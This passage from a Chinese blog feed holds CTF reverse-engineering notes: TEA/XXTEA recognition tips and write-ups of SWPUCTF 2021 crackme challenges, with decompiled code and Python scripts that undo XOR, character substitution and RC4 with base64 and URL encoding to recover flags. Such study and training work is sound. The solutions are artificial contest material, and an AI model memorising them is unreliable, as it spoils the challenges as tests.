class="token number">16</span> <span class="token operator">*</span> v17<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token operator">*</span>a1 <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                                                                        <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token operator">*</span>a1<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v17 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>         <span class="token operator">+</span> a1<span class="token punctuation">[</span>a2 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      a1<span class="token punctuation">[</span>a2 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v6<span class="token punctuation">;</span>      v17 <span class="token operator">=</span> v6<span class="token punctuation">;</span>      result <span class="token operator">=</span> <span class="token operator">--</span>v11<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> v11 <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>常量如果不确定的话，可以用IDA的插件findcrypt进行识别</li><li>见到移位+异或这种组合运算可以初步判断是tea系列算法</li><li>如果针对于每轮的轮数有不同的算法的话，可以确定是xxtea算法。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Reverse刷题</title>
      <link href="/2024/02/08/Reverse%E5%88%B7%E9%A2%98/"/>
      <url>/2024/02/08/Reverse%E5%88%B7%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="reverse刷题"><a class="markdownIt-Anchor" href="#reverse刷题"></a> Reverse刷题</h1><h2 id="swpuctf-2021-新生赛简简单单的逻辑"><a class="markdownIt-Anchor" href="#swpuctf-2021-新生赛简简单单的逻辑"></a> [SWPUCTF 2021 新生赛]简简单单的逻辑</h2><h3 id="题目描述"><a class="markdownIt-Anchor" href="#题目描述"></a> 题目描述</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">```<span class="token comment">#方法1 爆破  只有256个数字</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token builtin">list</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">138</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">188</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">143</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">169</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">]</span>result <span class="token operator">=</span> <span class="token string">''</span>key2<span class="token operator">=</span><span class="token string">'bcfba4d0038d48bd4b00f82796d393dfec'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">>></span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        char<span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>        <span class="token keyword">if</span> key2<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">:</span>i<span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token operator">^</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flag<span class="token operator">+=</span>char            result<span class="token operator">+=</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token operator">^</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">```flag <span class="token operator">=</span> <span class="token string">''</span><span class="token builtin">list</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">138</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">188</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">143</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">169</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">]</span>result <span class="token operator">=</span> <span class="token string">''</span><span class="token comment"># for i in range(len(list)):</span><span class="token comment">#     key = (list[i]>>4)+((list[i] &amp; 0xf)&lt;&lt;4)</span><span class="token comment">#     result += str(hex(ord(flag[i])^key))[2:].zfill(2)</span><span class="token comment"># print(result)</span><span class="token comment"># result=bcfba4d0038d48bd4b00f82796d393dfec</span>result2<span class="token operator">=</span><span class="token string">'bcfba4d0038d48bd4b00f82796d393dfec'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    key<span class="token operator">=</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">>></span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token number">0xf</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span>    char<span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>result2<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">:</span>i<span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">^</span>key<span class="token punctuation">)</span>    flag<span class="token operator">+=</span>char<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="swpuctf-2021-新生赛re1"><a class="markdownIt-Anchor" href="#swpuctf-2021-新生赛re1"></a> [SWPUCTF 2021 新生赛]re1</h2><h3 id="题目描述-2"><a class="markdownIt-Anchor" href="#题目描述-2"></a> 题目描述</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token number">1.</span>先查壳，发现无壳，直接丢进ida分析<span class="token number">2.</span>``` c<span class="token builtin">int</span> __cdecl main<span class="token punctuation">(</span><span class="token builtin">int</span> argc<span class="token punctuation">,</span> const char <span class="token operator">**</span>argv<span class="token punctuation">,</span> const char <span class="token operator">**</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>char Str2<span class="token punctuation">[</span><span class="token number">1008</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>20h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>60h<span class="token punctuation">]</span> BYREFchar Str1<span class="token punctuation">[</span><span class="token number">1000</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>410h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">+</span>390h<span class="token punctuation">]</span> BYREF<span class="token builtin">int</span> i<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>7FCh<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">+</span>77Ch<span class="token punctuation">]</span>_main<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>strcpy<span class="token punctuation">(</span>Str2<span class="token punctuation">,</span> “<span class="token punctuation">&#123;</span>34sy_r3v3rs3<span class="token punctuation">&#125;</span>”<span class="token punctuation">)</span><span class="token punctuation">;</span>printf<span class="token punctuation">(</span>“please put your flag<span class="token punctuation">:</span>”<span class="token punctuation">)</span><span class="token punctuation">;</span>scanf<span class="token punctuation">(</span>“<span class="token operator">%</span>s”<span class="token punctuation">,</span> Str1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">665</span><span class="token punctuation">;</span> <span class="token operator">+</span><span class="token operator">+</span>i <span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> Str1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">101</span> <span class="token punctuation">)</span>Str1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">51</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">665</span><span class="token punctuation">;</span> <span class="token operator">+</span><span class="token operator">+</span>i <span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> Str1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">97</span> <span class="token punctuation">)</span>Str1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">52</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> strcmp<span class="token punctuation">(</span>Str1<span class="token punctuation">,</span> Str2<span class="token punctuation">)</span> <span class="token punctuation">)</span>printf<span class="token punctuation">(</span>“you are wrong<span class="token punctuation">,</span>see again!”<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">else</span>printf<span class="token punctuation">(</span>“you are right!”<span class="token punctuation">)</span><span class="token punctuation">;</span>system<span class="token punctuation">(</span>“pause”<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token number">2.</span>发现只是简单的字符替换，编写脚本即可<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="exp"><a class="markdownIt-Anchor" href="#exp"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'&#123;34sy_r3v3rs3&#125;'</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">51</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">52</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="swpuctf-2021-新生赛"><a class="markdownIt-Anchor" href="#swpuctf-2021-新生赛"></a> [SWPUCTF 2021 新生赛]</h2><h3 id="题目描述-3"><a class="markdownIt-Anchor" href="#题目描述-3"></a> 题目描述</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token punctuation">,</span>urllib<span class="token punctuation">.</span>parsekey <span class="token operator">=</span> <span class="token string">"HereIsFlagggg"</span>flag <span class="token operator">=</span> <span class="token string">"xxxxxxxxxxxxxxxxxxx"</span>s_box <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>    s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>i <span class="token operator">=</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> s <span class="token keyword">in</span> flag<span class="token punctuation">:</span>    i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>    j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>    s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    t <span class="token operator">=</span> <span class="token punctuation">(</span>s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>    k <span class="token operator">=</span> s_box<span class="token punctuation">[</span>t<span class="token punctuation">]</span>    res<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">^</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>cipher <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>res<span class="token punctuation">)</span>crypt <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>cipher<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>enc <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>crypt<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>enc <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token comment"># enc = %C2%A6n%C2%87Y%1Ag%3F%C2%A01.%C2%9C%C3%B7%C3%8A%02%C3%80%C2%92W%C3%8C%C3%BA</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现是一个rc4然后进行base64加密再进行url编码，直接逆过来即可</p><h3 id="exp-2"><a class="markdownIt-Anchor" href="#exp-2"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">enc <span class="token operator">=</span> <span class="token string">'%C2%A6n%C2%87Y%1Ag%3F%C2%A01.%C2%9C%C3%B7%C3%8A%02%C3%80%C2%92W%C3%8C%C3%BA'</span><span class="token builtin">str</span><span class="token operator">=</span>urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>enc<span class="token punctuation">)</span>flag<span class="token operator">=</span><span class="token string">''</span>key <span class="token operator">=</span> <span class="token string">"HereIsFlagggg"</span>s_box <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>    s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>i <span class="token operator">=</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> s <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>    j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>    s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    t <span class="token operator">=</span> <span class="token punctuation">(</span>s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>    k <span class="token operator">=</span> s_box<span class="token punctuation">[</span>t<span class="token punctuation">]</span>    res<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">^</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>flag<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="swpuctf-2021-新生赛re2"><a class="markdownIt-Anchor" href="#swpuctf-2021-新生赛re2"></a> [SWPUCTF 2021 新生赛]re2</h2><h3 id="题目描述-4"><a class="markdownIt-Anchor" href="#题目描述-4"></a> 题目描述</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">int</span> __cdecl main<span class="token punctuation">(</span><span class="token builtin">int</span> argc<span class="token punctuation">,</span> const char <span class="token operator">**</span>argv<span class="token punctuation">,</span> const char <span class="token operator">**</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  char Str2<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>20h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>90h<span class="token punctuation">]</span> BYREF  char Str<span class="token punctuation">[</span><span class="token number">68</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>60h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>50h<span class="token punctuation">]</span> BYREF  <span class="token builtin">int</span> v7<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>A8h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>8h<span class="token punctuation">]</span>  <span class="token builtin">int</span> i<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>ACh<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>4h<span class="token punctuation">]</span>  _main<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  strcpy<span class="token punctuation">(</span>Str2<span class="token punctuation">,</span> <span class="token string">"ylqq]aycqyp&#123;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  printf<span class="token punctuation">(</span><span class="token operator">&amp;</span>Format<span class="token punctuation">)</span><span class="token punctuation">;</span>  gets<span class="token punctuation">(</span>Str<span class="token punctuation">)</span><span class="token punctuation">;</span>  v7 <span class="token operator">=</span> strlen<span class="token punctuation">(</span>Str<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> v7<span class="token punctuation">;</span> <span class="token operator">+</span><span class="token operator">+</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>Str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">96</span> <span class="token operator">|</span><span class="token operator">|</span> Str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">98</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> <span class="token punctuation">(</span>Str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">64</span> <span class="token operator">|</span><span class="token operator">|</span> Str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">66</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      Str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>      Str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">24</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> strcmp<span class="token punctuation">(</span>Str<span class="token punctuation">,</span> Str2<span class="token punctuation">)</span> <span class="token punctuation">)</span>    printf<span class="token punctuation">(</span><span class="token operator">&amp;</span>byte_404024<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    printf<span class="token punctuation">(</span>aBingo<span class="token punctuation">)</span><span class="token punctuation">;</span>  system<span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="exp-3"><a class="markdownIt-Anchor" href="#exp-3"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">这题存在多解<span class="token punctuation">:</span>str2 <span class="token operator">=</span> <span class="token string">'ylqq]aycqyp&#123;'</span>result <span class="token operator">=</span> <span class="token string">''</span><span class="token comment"># 遍历字符串中的每个字符</span><span class="token keyword">for</span> char <span class="token keyword">in</span> str2<span class="token punctuation">:</span>    <span class="token comment"># 获取字符的 ASCII 值并加上 2</span>    temp <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">2</span>        <span class="token comment"># 检查是否超过大写字母范围或小写字母范围</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>temp <span class="token operator">&lt;=</span> <span class="token number">96</span> <span class="token keyword">or</span> temp <span 